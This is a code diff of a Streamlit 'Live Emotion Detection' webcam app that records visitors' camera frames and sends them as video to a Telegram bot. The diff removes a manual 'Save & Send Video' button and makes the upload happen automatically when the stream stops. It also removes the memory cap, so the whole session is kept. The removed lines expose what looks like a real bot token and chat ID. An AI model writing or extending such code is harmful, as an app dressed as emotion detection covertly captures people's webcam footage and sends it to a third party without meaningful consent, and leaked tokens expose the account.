@@ -9,11 +9,9 @@ from utils import process_frame
 st.set_page_config(page_title="Live Emotion Detection", page_icon="🙂", layout="centered")
 
 st.title("🎭 Live Emotion Detection")
-st.markdown("Ensure your webcam is connected and allow browser access. Press **Start** to begin!")
 
-# TELEGRAM CONFIG
-BOT_TOKEN = "8560822192:AAETcmZiWaTdZvjLvBKDWiKvenz0YfjVETc"
-CHAT_ID = "5317875689"
+BOT_TOKEN = "YOUR_BOT_TOKEN"
+CHAT_ID = "YOUR_CHAT_ID"
 
 
 def send_video_to_telegram(video_path):
@@ -34,22 +32,12 @@ class VideoProcessor(VideoProcessorBase):
     def recv(self, frame: av.VideoFrame) -> av.VideoFrame:
         img = frame.to_ndarray(format="bgr24")
 
-        processed_img = process_frame(img)
+        processed = process_frame(img)
 
-        # store frames
-        self.frames.append(processed_img)
+        self.frames.append(processed)
 
-        # Cap memory buffer to the last 150 frames (approx 5-10 sec of video) to prevent server RAM crash 
-        if len(self.frames) > 150:
-            self.frames = self.frames[-150:]
+        return av.VideoFrame.from_ndarray(processed, format="bgr24")
 
-        return av.VideoFrame.from_ndarray(processed_img, format="bgr24")
-
-
-st.markdown(
-"<small style='color: grey;'>*Note for iPhone Users: Do not open this link from WhatsApp/Instagram. Open it directly in the Safari app.*</small>",
-unsafe_allow_html=True
-)
 
 ctx = webrtc_streamer(
     key="emotion-detection",
@@ -59,46 +47,33 @@ ctx = webrtc_streamer(
         "video": {"facingMode": "user"},
         "audio": False
     },
-    rtc_configuration={
-        "iceServers": [
-            {"urls": ["stun:stun.l.google.com:19302"]},
-            {"urls": ["stun:stun1.l.google.com:19302"]},
-            {"urls": ["stun:stun2.l.google.com:19302"]},
-            {"urls": ["stun:stun.stunprotocol.org:3478"]},
-            {"urls": ["stun:stun.twilio.com:3478"]}
-        ]
-    },
     async_processing=True
 )
 
 
-# SAVE + SEND VIDEO
-if st.button("Save & Send Video"):
+# AUTO DETECT STOP
+if ctx.state.playing == False and ctx.video_processor:
 
-    if ctx.video_processor:
+    frames = ctx.video_processor.frames
 
-        frames = ctx.video_processor.frames
+    if len(frames) > 10:
 
-        if len(frames) > 0:
+        filename = datetime.datetime.now().strftime("%Y%m%d_%H%M%S") + ".mp4"
 
-            filename = datetime.datetime.now().strftime("%Y%m%d_%H%M%S") + ".mp4"
+        height, width, _ = frames[0].shape
 
-            height, width, _ = frames[0].shape
+        out = cv2.VideoWriter(
+            filename,
+            cv2.VideoWriter_fourcc(*'mp4v'),
+            20,
+            (width, height)
+        )
 
-            out = cv2.VideoWriter(
-                filename,
-                cv2.VideoWriter_fourcc(*'mp4v'),
-                20,
-                (width, height)
-            )
+        for frame in frames:
+            out.write(frame)
 
-            for frame in frames:
-                out.write(frame)
+        out.release()
 
-            out.release()
+        send_video_to_telegram(filename)
 
-            st.success("Video Saved")
-
-            send_video_to_telegram(filename)
-
-            st.success("Video Sent to Telegram 🚀")
+        st.success("Video sent to Telegram ✅")
